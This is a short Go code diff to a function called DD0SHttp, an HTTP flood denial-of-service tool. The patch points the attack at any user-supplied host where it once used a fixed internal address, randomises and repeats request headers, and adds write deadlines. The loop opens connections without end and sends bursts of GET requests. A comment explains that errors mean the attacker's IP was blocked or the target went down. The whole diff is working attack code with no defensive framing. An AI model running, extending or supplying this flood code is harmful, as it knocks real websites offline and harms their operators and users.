@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"time"
 )
 
 var acceptall = []string{
@@ -29,18 +30,17 @@ func DD0SHttp(host string) {
 	header := " HTTP/1.1\r\nHost: " + host + "\r\n"
 	header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 	header += "User-Agent: Mozilla/5.0 (Linux) AppleWebKit/540.0 (KHTML, like Gecko) Chrome/99.0.4400.321 Safari/540.0\r\n"
-	header += acceptall[rand.Intn(len(acceptall))]
-
 	var s net.Conn
 
 	for {
-		s, err = net.Dial("tcp", "10.20.4.70:80")
+		s, err = net.Dial("tcp", host+":80")
 		if err != nil {
 			fmt.Println("Connection is down") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := "GET / "
-				request += header + "\r\n"
+				request += header + acceptall[rand.Intn(len(acceptall))] + header + "\r\n"
+				s.SetWriteDeadline(time.Now().Add(time.Minute))
 				s.Write([]byte(request))
 			}
 			s.Close()
